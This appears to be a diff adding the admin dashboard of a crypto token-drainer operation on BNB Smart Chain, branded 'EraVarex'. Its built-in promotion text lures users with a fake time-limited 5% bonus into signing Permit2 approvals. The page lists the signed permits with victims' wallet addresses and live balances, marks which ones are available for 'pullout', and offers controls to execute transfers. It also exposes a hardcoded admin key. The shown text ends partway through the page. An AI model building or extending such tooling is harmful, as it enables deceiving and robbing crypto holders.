@@ -1,0 +1,1510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>EraVarex — Super Portal</title>
+<meta name="description" content="EraVarex Super Dashboard: Manage contract settings, view stored Permit2 permits, and execute token transfers on BNB Smart Chain." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet" />
+<style>
+  /* ===== RESET & TOKENS ===== */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg-base:        #06080e;
+    --bg-surface:     #0c101a;
+    --bg-elevated:    #121826;
+    --bg-overlay:     #172033;
+    --bg-hover:       #1e293f;
+
+    --border-subtle:  #1b2537;
+    --border-default: #22324c;
+    --border-accent:  #0ea5e9;
+
+    --text-primary:   #f0f4f8;
+    --text-secondary: #94a3b8;
+    --text-muted:     #4b586e;
+    --text-inverse:   #06080e;
+
+    --accent-blue:    #06b6d4;
+    --accent-blue-dim:#0891b2;
+    --accent-brand:   #6366f1;
+    --accent-green:   #10b981;
+    --accent-red:     #f43f5e;
+    --accent-amber:   #f59e0b;
+    --accent-purple:  #8b5cf6;
+
+    --glow-blue:      rgba(6,182,212,0.20);
+    --glow-brand:     rgba(99,102,241,0.20);
+    --glow-green:     rgba(16,185,129,0.16);
+    --glow-red:       rgba(244,63,94,0.16);
+
+    --gradient-card:  linear-gradient(145deg, #0f1523 0%, #0a0e18 100%);
+    --gradient-blue:  linear-gradient(135deg, #4f46e5 0%, #06b6d4 100%);
+    --gradient-brand: linear-gradient(135deg, #6366f1 0%, #06b6d4 50%, #10b981 100%);
+    --gradient-green: linear-gradient(135deg, #059669, #10b981);
+
+    --radius-sm:  6px;
+    --radius-md:  10px;
+    --radius-lg:  16px;
+    --radius-xl:  24px;
+
+    --font-sans:  'Inter', system-ui, sans-serif;
+    --font-mono:  'Space Mono', ui-monospace, monospace;
+
+    --transition: all .2s cubic-bezier(.4,0,.2,1);
+  }
+
+  html { font-size: 16px; scroll-behavior: smooth; }
+  body {
+    font-family: var(--font-sans);
+    background: var(--bg-base);
+    color: var(--text-primary);
+    min-height: 100vh;
+    overflow-x: hidden;
+    line-height: 1.6;
+    padding-bottom: 60px;
+  }
+
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background:
+      radial-gradient(ellipse 80% 50% at 20% 0%, rgba(59,130,246,.07) 0%, transparent 60%),
+      radial-gradient(ellipse 60% 40% at 80% 100%, rgba(168,85,247,.05) 0%, transparent 60%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  body::after {
+    content: '';
+    position: fixed; inset: 0;
+    background-image:
+      linear-gradient(rgba(59,130,246,.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(59,130,246,.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .app-wrapper {
+    position: relative; z-index: 1;
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 16px 40px;
+  }
+
+  .app-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 0 24px;
+    gap: 16px;
+    flex-wrap: wrap;
+    border-bottom: 1px solid var(--border-subtle);
+    margin-bottom: 24px;
+  }
+
+  .logo-group { display: flex; align-items: center; gap: 12px; }
+
+  .logo-icon {
+    width: 40px; height: 40px;
+    background: var(--gradient-blue);
+    border-radius: var(--radius-md);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.25rem;
+    box-shadow: 0 0 20px rgba(59,130,246,.3);
+    flex-shrink: 0;
+  }
+
+  .logo-text { display: flex; flex-direction: column; line-height: 1.2; }
+  .logo-title { font-size: 1.15rem; font-weight: 700; color: var(--text-primary); letter-spacing: -.02em; }
+  .logo-sub { font-size: .72rem; color: var(--text-secondary); font-weight: 400; letter-spacing: .04em; text-transform: uppercase; }
+
+  .header-actions { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+
+  .network-pill {
+    display: flex; align-items: center; gap: 6px;
+    background: var(--bg-elevated);
+    border: 1px solid var(--border-default);
+    border-radius: 100px;
+    padding: 5px 12px;
+    font-size: .72rem;
+    color: var(--text-secondary);
+    font-weight: 500;
+  }
+
+  .network-dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: var(--accent-amber);
+    box-shadow: 0 0 8px var(--accent-amber);
+  }
+
+  .admin-badge {
+    display: flex; align-items: center; gap: 6px;
+    background: rgba(168,85,247,0.15);
+    border: 1px solid rgba(168,85,247,0.4);
+    border-radius: 100px;
+    padding: 5px 12px;
+    font-size: .75rem;
+    color: #c084fc;
+    font-weight: 600;
+  }
+
+  .card {
+    background: var(--gradient-card);
+    border: 1px solid var(--border-subtle);
+    border-radius: var(--radius-lg);
+    padding: 20px;
+    margin-bottom: 20px;
+    transition: var(--transition);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(59,130,246,.3), transparent);
+  }
+
+  .card-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 18px;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+
+  .card-title {
+    display: flex; align-items: center; gap: 10px;
+    font-size: .95rem; font-weight: 600;
+    color: var(--text-primary);
+  }
+
+  .card-title-icon {
+    width: 28px; height: 28px;
+    border-radius: var(--radius-sm);
+    display: flex; align-items: center; justify-content: center;
+    font-size: .85rem;
+    background: var(--bg-overlay);
+    border: 1px solid var(--border-default);
+  }
+
+  .form-group { margin-bottom: 16px; }
+
+  .form-label {
+    display: block;
+    font-size: .72rem;
+    font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: .07em;
+    margin-bottom: 6px;
+  }
+
+  .form-control {
+    width: 100%;
+    padding: 12px 14px;
+    background: var(--bg-base);
+    border: 1px solid var(--border-default);
+    border-radius: var(--radius-md);
+    color: var(--text-primary);
+    font-size: .9rem;
+    font-family: var(--font-sans);
+    outline: none;
+    transition: var(--transition);
+  }
+
+  .form-control:focus {
+    border-color: var(--accent-blue);
+    box-shadow: 0 0 0 3px var(--glow-blue);
+  }
+
+  .form-control.mono { font-family: var(--font-mono); font-size: .85rem; word-break: break-all; }
+
+  .btn {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    font-family: var(--font-sans);
+    font-weight: 600; font-size: .875rem;
+    border: none; cursor: pointer;
+    border-radius: var(--radius-md);
+    transition: var(--transition);
+    text-decoration: none;
+    white-space: nowrap;
+    padding: 11px 18px;
+    min-height: 42px;
+  }
+
+  .btn-load {
+    background: var(--gradient-blue);
+    color: #fff;
+    width: 100%;
+    margin-top: 6px;
+    box-shadow: 0 4px 20px rgba(59,130,246,.25);
+  }
+  .btn-load:hover { box-shadow: 0 6px 30px rgba(59,130,246,.4); }
+
+  .btn-secondary {
+    background: var(--bg-elevated);
+    color: var(--text-secondary);
+    border: 1px solid var(--border-default);
+    padding: 8px 14px;
+    font-size: .8rem;
+  }
+  .btn-secondary:hover { border-color: var(--border-accent); color: var(--text-primary); background: var(--bg-hover); }
+
+  .btn-pull {
+    background: var(--gradient-green);
+    color: #fff;
+    padding: 7px 16px;
+    font-size: .82rem;
+    font-weight: 700;
+    box-shadow: 0 2px 10px rgba(34,197,94,.3);
+  }
+  .btn-pull:hover { box-shadow: 0 4px 18px rgba(34,197,94,.45); transform: translateY(-1px); }
+
+  .btn-danger {
+    background: rgba(239,68,68,.1);
+    color: var(--accent-red);
+    border: 1px solid rgba(239,68,68,.3);
+    padding: 8px 14px;
+    font-size: .8rem;
+  }
+  .btn-danger:hover { background: rgba(239,68,68,.2); }
+
+  .btn-copy {
+    background: transparent;
+    border: none;
+    cursor: pointer;
+    color: var(--text-muted);
+    font-size: .9rem;
+    padding: 2px 4px;
+    transition: var(--transition);
+  }
+  .btn-copy:hover { color: var(--accent-blue); transform: scale(1.1); }
+
+  .alert {
+    margin-top: 16px;
+    padding: 12px 16px;
+    border-radius: var(--radius-md);
+    font-size: .83rem;
+    line-height: 1.6;
+    display: flex; align-items: flex-start; gap: 10px;
+    word-break: break-all;
+  }
+  .alert-ok { background: rgba(34,197,94,.08); border: 1px solid rgba(34,197,94,.3); color: #4ade80; }
+  .alert-err { background: rgba(239,68,68,.08); border: 1px solid rgba(239,68,68,.3); color: #fc8181; }
+  .alert-info { background: rgba(59,130,246,.08); border: 1px solid rgba(59,130,246,.25); color: #93c5fd; }
+
+  /* ===== STATS GRID ===== */
+  .stats-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+
+  .stat-card {
+    background: var(--bg-overlay);
+    border: 1px solid var(--border-default);
+    border-radius: var(--radius-md);
+    padding: 14px;
+  }
+
+  .stat-label {
+    font-size: .68rem; font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase; letter-spacing: .06em;
+    margin-bottom: 4px;
+  }
+
+  .stat-value {
+    font-size: 1.15rem; font-weight: 700;
+    color: var(--text-primary);
+    line-height: 1.2;
+    word-break: break-all;
+  }
+
+  .stat-value.mono-small { font-family: var(--font-mono); font-size: .82rem; }
+  .stat-sub { font-size: .7rem; color: var(--text-muted); margin-top: 4px; }
+
+  .settings-row {
+    display: flex; gap: 8px; flex-wrap: wrap;
+    padding-top: 14px;
+    border-top: 1px solid var(--border-subtle);
+  }
+
+  /* ===== TABLE ===== */
+  .table-wrapper {
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    border: 1px solid var(--border-subtle);
+    border-radius: var(--radius-md);
+    background: var(--bg-base);
+  }
+
+  table { width: 100%; border-collapse: collapse; font-size: .83rem; text-align: left; min-width: 780px; }
+
+  th {
+    padding: 12px 14px;
+    color: var(--text-muted);
+    font-size: .7rem; font-weight: 600;
+    text-transform: uppercase; letter-spacing: .06em;
+    border-bottom: 1px solid var(--border-default);
+    background: var(--bg-surface);
+    white-space: nowrap;
+  }
+
+  td {
+    padding: 14px;
+    border-bottom: 1px solid var(--border-subtle);
+    vertical-align: middle;
+    color: var(--text-secondary);
+  }
+
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: var(--bg-hover); color: var(--text-primary); }
+
+  .owner-cell {
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+  }
+
+  .full-addr-row {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .full-addr {
+    font-family: var(--font-mono);
+    font-size: .78rem;
+    color: #60a5fa;
+    word-break: break-all;
+    user-select: all;
+  }
+
+  .td-amount { font-family: var(--font-mono); font-weight: 700; color: var(--text-primary); font-size: .9rem; }
+
+  .badge {
+    display: inline-flex; align-items: center;
+    padding: 3px 9px;
+    border-radius: 100px;
+    font-size: .7rem; font-weight: 600;
+    text-transform: uppercase; letter-spacing: .05em;
+  }
+  .badge-pending  { background: rgba(59,130,246,.12); color: #60a5fa; border: 1px solid rgba(59,130,246,.3); }
+  .badge-executed { background: rgba(34,197,94,.12);  color: #4ade80; border: 1px solid rgba(34,197,94,.3); }
+  .badge-partial  { background: rgba(245,158,11,.12); color: #fbbf24; border: 1px solid rgba(245,158,11,.3); }
+  .badge-failed   { background: rgba(239,68,68,.12);  color: #f87171; border: 1px solid rgba(239,68,68,.3); }
+  .badge-expired  { background: rgba(100,116,139,.12);color: #94a3b8; border: 1px solid rgba(100,116,139,.3); }
+  .badge-pullable    { background: rgba(34,197,94,.16); color: #4ade80; border: 1px solid rgba(34,197,94,.4); box-shadow: 0 0 8px rgba(34,197,94,0.18); }
+  .badge-pullable-no { background: rgba(148,163,184,.12); color: #94a3b8; border: 1px solid rgba(148,163,184,.3); }
+
+  .progress-wrap { height: 4px; background: var(--bg-surface); border-radius: 10px; overflow: hidden; margin-top: 4px; }
+  .progress-fill { height: 100%; background: var(--accent-green); border-radius: 10px; }
+
+  .user-bal-pill {
+    display: inline-flex;
+    flex-direction: column;
+    background: rgba(34,197,94,0.08);
+    border: 1px solid rgba(34,197,94,0.25);
+    border-radius: var(--radius-sm);
+    padding: 3px 8px;
+    margin-top: 4px;
+  }
+  .user-bal-val { font-family: var(--font-mono); font-weight: 600; color: #4ade80; font-size: .75rem; }
+  .user-bal-label { font-size: .62rem; color: var(--text-muted); text-transform: uppercase; }
+
+  .empty-state { text-align: center; padding: 40px 16px; color: var(--text-muted); }
+  .empty-icon { font-size: 2.2rem; margin-bottom: 8px; }
+
+  .spinner {
+    display: inline-block; width: 14px; height: 14px;
+    border: 2px solid rgba(255,255,255,.3);
+    border-top-color: #fff; border-radius: 50%;
+    animation: spin .7s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ===== PULL MODAL ===== */
+  .modal-overlay {
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.75);
+    backdrop-filter: blur(4px);
+    z-index: 1000;
+    display: flex; align-items: center; justify-content: center;
+    padding: 16px;
+  }
+  .modal-box {
+    background: #0d121c;
+    border: 1px solid var(--border-accent);
+    border-radius: var(--radius-lg);
+    width: 100%;
+    max-width: 520px;
+    padding: 24px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+    position: relative;
+    max-height: 90vh;
+    overflow-y: auto;
+  }
+  .modal-header {
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 18px; border-bottom: 1px solid var(--border-subtle);
+    padding-bottom: 12px;
+  }
+  .modal-title { font-size: 1.1rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; }
+  .modal-close {
+    background: transparent; border: none; font-size: 1.2rem; color: var(--text-muted); cursor: pointer; padding: 4px;
+  }
+  .modal-close:hover { color: #fff; }
+
+  .summary-box {
+    background: var(--bg-base);
+    border: 1px solid var(--border-default);
+    border-radius: var(--radius-md);
+    padding: 14px;
+    margin-bottom: 18px;
+    font-size: .83rem;
+  }
+  .summary-row {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 4px 0;
+    gap: 8px;
+  }
+  .summary-label { color: var(--text-muted); font-size: .75rem; text-transform: uppercase; }
+  .summary-val { color: var(--text-primary); font-family: var(--font-mono); font-size: .82rem; word-break: break-all; }
+
+  .quick-amounts {
+    display: flex; gap: 8px; margin-top: 8px; flex-wrap: wrap;
+  }
+  .btn-chip {
+    background: var(--bg-elevated);
+    border: 1px solid var(--border-default);
+    border-radius: 100px;
+    padding: 4px 12px;
+    font-size: .72rem;
+    color: var(--text-secondary);
+    cursor: pointer;
+    font-family: var(--font-mono);
+  }
+  .btn-chip:hover { border-color: var(--accent-blue); color: #fff; }
+
+  /* ===== MOBILE ADJUSTMENTS ===== */
+  @media (max-width: 640px) {
+    .app-header { flex-direction: column; align-items: flex-start; gap: 12px; }
+    .header-actions { width: 100%; justify-content: space-between; }
+    .card { padding: 16px; }
+    .stats-grid { grid-template-columns: 1fr 1fr; gap: 8px; }
+    .stat-card { padding: 10px; }
+    .stat-value { font-size: 1rem; }
+    .settings-row { flex-direction: column; }
+    .settings-row .btn { width: 100%; }
+    .modal-box { padding: 16px; }
+  }
+
+  /* Toggle slider switch */
+  .slider-toggle {
+    position: absolute;
+    cursor: pointer;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background-color: #334155;
+    transition: .3s;
+    border-radius: 34px;
+    border: 1px solid var(--border-default);
+  }
+  .slider-toggle:before {
+    position: absolute;
+    content: "";
+    height: 18px; width: 18px;
+    left: 3px; bottom: 3px;
+    background-color: white;
+    transition: .3s;
+    border-radius: 50%;
+  }
+  input:checked + .slider-toggle {
+    background: linear-gradient(135deg, #16a34a, #22c55e);
+    border-color: #22c55e;
+  }
+  input:checked + .slider-toggle:before {
+    transform: translateX(22px);
+  }
+</style>
+</head>
+<body>
+<div class="app-wrapper">
+  <header class="app-header">
+    <div class="logo-group">
+      <div class="logo-icon" style="background:transparent;border:none;display:flex;align-items:center;justify-content:center;">
+        <svg width="34" height="34" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <polygon points="18,3 32,10.5 32,25.5 18,33 4,25.5 4,10.5" stroke="url(#era_grad_super)" stroke-width="2.2" fill="url(#era_hex_super)" />
+          <path d="M12 12H24M12 18H20M12 24H24" stroke="#ffffff" stroke-width="2.2" stroke-linecap="round" />
+          <circle cx="24" cy="18" r="2.2" fill="#06b6d4" />
+          <defs>
+            <linearGradient id="era_grad_super" x1="4" y1="3" x2="32" y2="33" gradientUnits="userSpaceOnUse">
+              <stop stop-color="#6366f1" />
+              <stop offset="0.5" stop-color="#06b6d4" />
+              <stop offset="1" stop-color="#10b981" />
+            </linearGradient>
+            <radialGradient id="era_hex_super" cx="50%" cy="50%" r="50%">
+              <stop offset="0%" stop-color="#06b6d4" stop-opacity="0.25" />
+              <stop offset="100%" stop-color="#1e1b4b" stop-opacity="0.6" />
+            </radialGradient>
+          </defs>
+        </svg>
+      </div>
+      <div class="logo-text">
+        <span class="logo-title">EraVarex</span>
+        <span class="logo-sub">Super Portal · Management</span>
+      </div>
+    </div>
+    <div class="header-actions">
+      <div class="network-pill">
+        <div class="network-dot"></div>
+        BSC Mainnet
+      </div>
+      <div class="admin-badge">
+        <span>🛡</span> Super Restricted
+      </div>
+      <a href="/" class="btn btn-secondary" style="text-decoration:none;font-size:.78rem;padding:6px 12px;">← User Page</a>
+    </div>
+  </header>
+
+  <div id="admin-app"></div>
+</div>
+
+<!-- Modal Container -->
+<div id="modal-container"></div>
+
+<script>
+'use strict';
+
+const API_BASE = '/api';
+const ERAVAREX_CONTRACT_ADDRESS = "0x768D5df1E316101C1C3862354F46217ac90a08bf";
+const ERAVAREX_ADMIN_WALLET     = "0xf07F812568800638909CE5b7e975545863dff92d";
+const DEFAULT_REWARD_CONFIG = {
+  enabled: true,
+  percentage: "5.0",
+  durationHours: 72,
+  badgeText: "Flash Event · 72H Only",
+  headline: "Claim Your 5% Reward Bonus",
+  description: "Special 72-hour reward event! Connect your wallet and complete Permit2 approval within the countdown window to qualify for an exclusive one-time 5% bonus reward. Valid for all newly connected wallets and users approving again.",
+  inCardText: "Connect & approve within 72 hours to receive an exclusive one-time 5% reward bonus!",
+  perk1Title: "5% One-Time Reward",
+  perk1Desc: "Automatically locked in when you complete Permit2 approval.",
+  perk2Title: "New & Re-Approvals",
+  perk2Desc: "Applicable for first-time connections & wallets approving again.",
+  perk3Title: "Instant BSC On-Chain",
+  perk3Desc: "Direct BSC Mainnet confirmation with 0 waiting period."
+};
+
+const state = {
+  adminKey: localStorage.getItem('adminKey') || 'tg-8f3k2p9xQm7vNrL4wZ1cJ6hYbDsEuA0',
+  adminStatus: null,
+  permits: [],
+  adminBusy: false,
+  adminMsg: '',
+  adminMsgKind: '',
+  activePullPermit: null,
+  pullSubmitting: false,
+  pullError: '',
+  pullSuccess: '',
+  rewardConfig: { ...DEFAULT_REWARD_CONFIG },
+  rewardBusy: false,
+  rewardMsg: '',
+  rewardMsgKind: ''
+};
+
+function esc(s) {
+  return String(s || '').replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+}
+
+function shortAddr(addr) {
+  if (!addr) return '—';
+  return addr.slice(0, 8) + '…' + addr.slice(-6);
+}
+
+function fmtDate(ts) {
+  if (!ts) return '—';
+  return new Date(ts * 1000).toLocaleDateString(undefined, { year:"numeric", month:"short", day:"numeric" });
+}
+
+function fmtDateTimeBD(ts) {
+  if (!ts) return '—';
+  try {
+    const d = new Date(Number(ts) * 1000);
+    return new Intl.DateTimeFormat('en-US', {
+      timeZone: 'Asia/Dhaka',
+      month: 'short',
+      day: 'numeric',
+      year: 'numeric',
+      hour: 'numeric',
+      minute: '2-digit',
+      hour12: true
+    }).format(d);
+  } catch (e) {
+    return new Date(Number(ts) * 1000).toLocaleString();
+  }
+}
+
+function getExpiryCountdown(ts) {
+  if (!ts) return '';
+  const now = Math.floor(Date.now() / 1000);
+  const diff = Number(ts) - now;
+  if (diff <= 0) return 'Expired';
+  const days = Math.floor(diff / 86400);
+  const hours = Math.floor((diff % 86400) / 3600);
+  if (days > 0) return `${days}d ${hours}h left`;
+  return `${hours}h left`;
+}
+
+function isPullable(p) {
+  if (p.pullable !== undefined) return p.pullable;
+  const now = Math.floor(Date.now() / 1000);
+  return Number(p.expiration) > now && Number(p.sigDeadline) > now && (p.status === 'pending' || p.status === 'partial');
+}
+
+function pullableBadgeHtml(p) {
+  if (p.pullableStatus === 'ready' || p.pullableStatus === 'ready_submit' || (p.pullable && p.pullableStatus !== 'expired_sig' && p.pullableStatus !== 'no_erc20')) {
+    return `
+      <div style="display:inline-flex;align-items:center;gap:4px;">
+        <span class="badge badge-pullable">🟢 OK Always</span>
+      </div>
+      <div style="font-size:.67rem;color:#4ade80;margin-top:2px;font-weight:600;">Available for Pullout</div>
+    `;
+  }
+  if (p.pullableStatus === 'no_erc20') {
+    return `
+      <div style="display:inline-flex;align-items:center;gap:4px;">
+        <span class="badge badge-failed" title="${esc(p.pullableReason || '')}">❌ Not Approved</span>
+      </div>
+      <div style="font-size:.67rem;color:#f87171;margin-top:2px;font-weight:600;">ERC-20 Revoked / 0</div>
+    `;
+  }
+  if (p.pullableStatus === 'expired_sig') {
+    return `
+      <div style="display:inline-flex;align-items:center;gap:4px;">
+        <span class="badge badge-failed" title="${esc(p.pullableReason || '')}">❌ Expired</span>
+      </div>
+      <div style="font-size:.67rem;color:#f87171;margin-top:2px;font-weight:600;">Needs User Re-Sign</div>
+    `;
+  }
+  return `
+    <div style="display:inline-flex;align-items:center;gap:4px;">
+      <span class="badge badge-expired">⚪ Inactive</span>
+    </div>
+  `;
+}
+
+function spentPct(p) {
+  if (!p.amount || p.amount === '0') return 0;
+  return Math.min(100, Math.round((Number(p.spent || 0) / Number(p.amount)) * 100));
+}
+
+function badgeHtml(status) {
+  const map = { pending:"pending", executed:"executed", partial:"partial", failed:"failed", expired:"expired" };
+  const cls = map[status] || "expired";
+  return `<span class="badge badge-${cls}">${esc(status)}</span>`;
+}
+
+function alertHtml(msg, kind) {
+  if (!msg) return '';
+  const cls = kind === 'ok' ? 'alert-ok' : kind === 'err' ? 'alert-err' : 'alert-info';
+  const icon = kind === 'ok' ? '✅' : kind === 'err' ? '❌' : 'ℹ️';
+  return `<div class="alert ${cls}"><span>${icon}</span><span>${esc(msg)}</span></div>`;
+}
+
+function copyText(txt) {
+  navigator.clipboard.writeText(txt).then(() => {
+    alert('Copied to clipboard:\n' + txt);
+  }).catch(() => {
+    prompt('Copy address manually:', txt);
+  });
+}
+
+async function req(path, { method = 'GET', body, headers = {} } = {}) {
+  const res = await fetch(`${API_BASE}${path}`, {
+    method,
+    headers: { 'Content-Type': 'application/json', ...headers },
+    body: body ? JSON.stringify(body) : undefined
+  });
+  const text = await res.text();
+  let data = {};
+  try { data = text ? JSON.parse(text) : {}; } catch { data = { error: text }; }
+  if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
+  return data;
+}
+
+function adminApi(key) {
+  const h = { 'x-admin-key': key };
+  return {
+    status:      ()                => req('/super/status', { headers: h }),
+    permits:     ()                => req('/super/permits', { headers: h }),
+    execute:     (id, to, amount)  => req(`/super/permits/${id}/execute`, { method: 'POST', headers: h, body: { to, amount } }),
+    setPaused:   (p)               => req('/super/settings/paused',   { method: 'POST', headers: h, body: { paused: p } }),
+    setFee:      (f)               => req('/super/settings/fee',      { method: 'POST', headers: h, body: { feeBps: f } }),
+    setTreasury:      (t)               => req('/super/settings/treasury', { method: 'POST', headers: h, body: { treasury: t } }),
+    rescue:           (b)               => req('/super/rescue',            { method: 'POST', headers: h, body: b }),
+    getRewardConfig:  ()                => req('/super/reward-config',     { headers: h }),
+    saveRewardConfig: (b)               => req('/super/reward-config',     { method: 'POST', headers: h, body: b })
+  };
+}
+
+function render() {
+  const root = document.getElementById('admin-app');
+  const s = state.adminStatus;
+  if (state.permits && state.permits.length) {
+    state.permits.sort((a, b) => Number(b.id) - Number(a.id));
+  }
+
+  root.innerHTML = `
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title"><div class="card-title-icon">🔐</div> Super Authentication</div>
+      </div>
+      <div class="form-group">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+          <label class="form-label" for="inp-key" style="margin-bottom:0;">Super API Key</label>
+          <button type="button" id="btn-toggle-key" style="background:none;border:none;color:var(--accent-blue);font-size:.75rem;cursor:pointer;padding:0;">👁 Show Key</button>
+        </div>
+        <input id="inp-key" class="form-control mono" type="password"
+               placeholder="Enter super key" value="${esc(state.adminKey)}" autocomplete="off" />
+        <div style="font-size:.72rem;color:var(--text-muted);margin-top:7px;">
+          Key: <code style="color:#60a5fa;cursor:pointer;font-family:var(--font-mono);" onclick="document.getElementById('inp-key').value='tg-8f3k2p9xQm7vNrL4wZ1cJ6hYbDsEuA0';">tg-8f3k2p9xQm7vNrL4wZ1cJ6hYbDsEuA0</code> (click to auto-fill)
+        </div>
+      </div>
+      <button id="btn-load" class="btn btn-load" ${state.adminBusy ? 'disabled' : ''}>
+        ${state.adminBusy ? '<span class="spinner"></span> Loading…' : '📡 Load Super Dashboard'}
+      </button>
+      ${alertHtml(state.adminMsg, state.adminMsgKind)}
+    </div>
+
+    ${s ? buildDashboard(s) : ''}
+  `;
+
+  renderModal();
+  bind();
+}
+
+function buildDashboard(s) {
+  return `
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title"><div class="card-title-icon">📊</div> Contract Status</div>
+        <span class="badge ${s.paused ? 'badge-failed' : 'badge-executed'}">${s.paused ? 'Paused' : 'Active'}</span>
+      </div>
+
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-label">Admin Wallet</div>
+          <div class="stat-value mono-small">${esc(shortAddr(s.admin))}</div>
+          <div class="stat-sub">${esc(s.admin)}</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Treasury Wallet</div>
+          <div class="stat-value mono-small">${esc(shortAddr(s.treasury))}</div>
+          <div class="stat-sub">${esc(s.treasury)}</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Admin Gas Balance</div>
+          <div class="stat-value">${esc(parseFloat(s.bnbBalance || '0').toFixed(4))}</div>
+          <div class="stat-sub">BNB for gas</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Protocol Fee</div>
+          <div class="stat-value">${esc(String(s.feeBps))}</div>
+          <div class="stat-sub">bps (${((s.feeBps / 10000) * 100).toFixed(2)}%)</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Permit2 Contract</div>
+          <div class="stat-value mono-small">${esc(shortAddr(s.permit2))}</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Gateway Contract</div>
+          <div class="stat-value mono-small">${esc(shortAddr(s.gateway))}</div>
+        </div>
+      </div>
+
+      <div class="settings-row">
+        <button id="btn-toggle-pause" class="btn ${s.paused ? 'btn-secondary' : 'btn-danger'}">
+          ${s.paused ? '▶ Unpause Contract' : '⏸ Pause Contract'}
+        </button>
+        <button id="btn-set-fee" class="btn btn-secondary">💰 Set Fee</button>
+        <button id="btn-set-treasury" class="btn btn-secondary">🏦 Set Treasury</button>
+        <button id="btn-rescue" class="btn btn-secondary">🚑 Rescue Tokens</button>
+      </div>
+    </div>
+
+    ${buildRewardConfigCard()}
+
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title"><div class="card-title-icon">📋</div> Signed Permits Database</div>
+        <span style="font-size:.78rem;color:var(--text-muted)">${state.permits.length} record${state.permits.length !== 1 ? 's' : ''}</span>
+      </div>
+
+      ${state.permits.length === 0
+        ? `<div class="empty-state"><div class="empty-icon">📭</div><div class="empty-text">No permits stored yet. Connect user wallet and approve to see records here.</div></div>`
+        : `<div class="table-wrapper">
+            <table>
+              <thead>
+                <tr>
+                  <th>ID</th>
+                  <th>Approved Time (BD)</th>
+                  <th>Expiration Time (BD)</th>
+                  <th>Available for Pullout</th>
+                  <th>User Wallet Address (Fully Visible)</th>
+                  <th>Refer Link</th>
+                  <th>Referred By</th>
+                  <th>Token</th>
+                  <th>Live Wallet Balance</th>
+                  <th>Approved Limit</th>
+                  <th>Total Spent</th>
+                  <th>Status</th>
+                  <th>Action</th>
+                </tr>
+              </thead>
+              <tbody>
+                ${state.permits.map(p => buildPermitRow(p)).join('')}
+              </tbody>
+            </table>
+          </div>`
+      }
+    </div>
+  `;
+}
+
+function buildRewardConfigCard() {
+  const rc = state.rewardConfig || DEFAULT_REWARD_CONFIG;
+  return `
+    <div class="card" id="reward-config-card" style="border: 1px solid rgba(245, 158, 11, 0.45); box-shadow: 0 10px 35px rgba(245, 158, 11, 0.08); position: relative; overflow: hidden;">
+      <div class="card-header">
+        <div class="card-title">
+          <div class="card-title-icon" style="background: rgba(245, 158, 11, 0.15); border-color: rgba(245, 158, 11, 0.35); color: #fbbf24;">🎁</div>
+          Reward Bonus Promotion Configuration
+        </div>
+        <div style="display:flex;align-items:center;gap:10px;">
+          <span class="badge ${rc.enabled ? 'badge-executed' : 'badge-failed'}" id="rew-status-pill">
+            ${rc.enabled ? '🟢 Promotion Active' : '🔴 Promotion Disabled'}
+          </span>
+        </div>
+      </div>
+
+      <div style="font-size:0.83rem;color:var(--text-secondary);margin-bottom:20px;line-height:1.6;">
+        Manage the limited-time reward bonus displayed on the user front page. Admin can modify the bonus percentage, countdown time window, headlines, descriptions, and active status anytime. All updates sync to the user front page instantly.
+      </div>
+
